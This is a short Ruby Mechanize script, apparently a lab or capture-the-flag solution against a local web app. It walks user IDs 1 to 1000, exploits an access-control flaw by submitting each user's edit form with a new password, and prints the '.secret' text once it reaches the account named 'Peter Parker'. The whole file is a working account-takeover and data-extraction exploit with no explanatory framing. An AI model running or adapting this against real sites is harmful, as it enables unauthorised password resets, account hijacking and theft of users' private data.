#! /usr/bin/env ruby

require 'mechanize'

Mechanize.new.instance_eval do
  1.upto(1000) do |i|
    begin
      get "http://localhost:3000/users/#{i}/edit"

      page.forms.first.tap do |f|
        f['user[password]'] = '123456789'
        f.submit
      end

      if page.search('h1').text.match(/Peter Parker/)
        puts page.search('.secret').text.strip
        exit
      end

    rescue
      # do nothing
    end
  end
end
